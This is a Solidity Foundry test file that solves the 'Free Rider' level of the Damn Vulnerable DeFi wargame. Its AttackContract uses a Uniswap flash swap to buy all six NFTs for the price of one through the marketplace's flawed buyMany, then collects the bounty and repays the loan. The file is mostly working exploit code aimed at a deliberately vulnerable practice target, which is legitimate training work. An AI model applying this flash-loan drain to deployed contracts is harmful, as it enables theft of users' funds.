// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {FreeRiderBuyer} from "../src/free-rider/FreeRiderBuyer.sol";
import {FreeRiderNFTMarketplace} from "../src/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../src/free-rider/Interfaces.sol";
import {DamnValuableNFT} from "../src/DamnValuableNFT.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {WETH9} from "../src/WETH9.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FreeRider is Test {
    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;
    uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    // The buyer will offer 45 ETH as payout for the job
    uint256 internal constant BUYER_PAYOUT = 45 ether;

    // Initial reserves for the Uniswap v2 pool
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
    uint256 internal constant DEADLINE = 10_000_000;

    AttackContract internal attackContract;
    FreeRiderBuyer internal freeRiderBuyer;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    WETH9 internal weth;
    address payable internal buyer;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {

        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
        buyer = payable(address(uint160(uint256(keccak256(abi.encodePacked("buyer"))))));
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);
        vm.deal(buyer, BUYER_PAYOUT);
        vm.deal(attacker, 0.5 ether);

        // Make WETH/DVT pool so we can flash swap some WETH.
        weth = new WETH9();
        vm.startPrank(deployer);
        dvt = new DamnValuableToken();

        // Deploy Uniswap Factory and Router
        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Approve DVT and create Uniswap v2 pair with WETH and add liquidity
        // This takes care of deploying the pair automatically
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));

        // Sanity checks
        assertEq(uniswapV2Pair.token0(), address(dvt));
        assertEq(uniswapV2Pair.token1(), address(weth));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        // Launch the NFT marketplace with 90 ETH and 6 NFTs
        // Make the marketplace the owner and approve all, then list all for sale at 15 ETH each.
        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);
        damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());

        for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(damnValuableNFT.ownerOf(id), deployer);
        }

        damnValuableNFT.setApprovalForAll(address(freeRiderNFTMarketplace), true);

        uint256[] memory NFTsForSell = new uint256[](6);
        uint256[] memory NFTsPrices = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
            NFTsForSell[i] = i;
            NFTsPrices[i] = NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);
        assertEq(freeRiderNFTMarketplace.amountOfOffers(), AMOUNT_OF_NFTS);
        vm.stopPrank();

        // Instantiate the bounty contract with 45 ETH and the attacker as recipient partner.
        vm.startPrank(buyer);
        freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(attacker, address(damnValuableNFT));
        vm.stopPrank();

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);
        attackContract = new AttackContract(
            freeRiderNFTMarketplace,
            uniswapV2Pair,
            weth,
            freeRiderBuyer,
            damnValuableNFT
        );
        attackContract.flashSwap();
        console.log("balance of attacker:", address(attacker).balance / 1e15, "ETH");
        vm.stopPrank();

        // Optional: The freeRiderBuyer gives all the nfts to the buyer.
        vm.startPrank(buyer);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            damnValuableNFT.transferFrom(address(freeRiderBuyer), buyer, tokenId);
            assertEq(damnValuableNFT.ownerOf(tokenId), buyer);
        }
        vm.stopPrank();

        validation();
    }

    function validation() internal {
        assertGt(attacker.balance, BUYER_PAYOUT); // 45 + initial 0.5 ETH amount given to attacker.
        assertEq(address(freeRiderBuyer).balance, 0); // bounty given
        assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0); // no nfts 
        assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE); // marketplace is poor
        console.log(unicode"\n🎉🥳 Congratulations, you beat the level!!! 🥳🎉");
    }
}

contract AttackContract {
    FreeRiderNFTMarketplace public freeRiderNFTMarketplace;
    IUniswapV2Pair public uniswapV2Pair;
    FreeRiderBuyer public freeRiderBuyer;
    DamnValuableNFT public damnValuableNFT;
    WETH9 public weth;
    uint256[] public tokenIds;

    constructor(
        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,
        IUniswapV2Pair _uniswapV2Pair,
        WETH9 _weth,
        FreeRiderBuyer _freeRiderBuyer,
        DamnValuableNFT _damnValuableNFT
        ) {
        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
        uniswapV2Pair = _uniswapV2Pair;
        weth = _weth;
        freeRiderBuyer = _freeRiderBuyer;
        damnValuableNFT = _damnValuableNFT;
    }

    function flashSwap() external {
        // This is a Uniswap V2 DVT/WETH pool. Flash swap for 15 WETH.
        uniswapV2Pair.swap(0, 15 ether, address(this), bytes("1337"));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        console.log("Flash swap of 15 WETH received by attackContract:", weth.balanceOf(address(this)) / 1e15, "WETH");
        weth.withdraw(15 ether);

        // Put ids into array
        for (uint256 i; i < 6; i++) {
            tokenIds.push(i);
        }

        // Pay Marketplace 15 ETH, and in return receive 6 NFTs and get paid 90 ether.
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(tokenIds);
        console.log("Balance of marketplace after buyOne exploit:", address(freeRiderNFTMarketplace).balance / 1e15, "ETH");
        console.log("Balance of attackContract after buyOne exploit:", address(this).balance / 1e15, "ETH");
        console.log("Balance of freeRiderBuyer before receiving all 6 NFTs:", address(freeRiderBuyer).balance / 1e15, "ETH");

        // Send all 6 NFTs to `freeRiderBuyer` contract and get the 45 ETH payout.
        for (uint256 i; i < 6; i++) {
            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderBuyer), i, "");
        }
        console.log("Balance of freeRiderBuyer after receiving all 6 NFTs:", address(freeRiderBuyer).balance / 1e15, "ETH");

        // Repay flash swap of 15 WETH + fee
        weth.deposit{value: 15.1 ether}();
        weth.transfer(address(uniswapV2Pair), 15.1 ether);
        console.log("Balance of attackContract after returning flash swap loan:", address(this).balance / 1e15, "ETH");
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}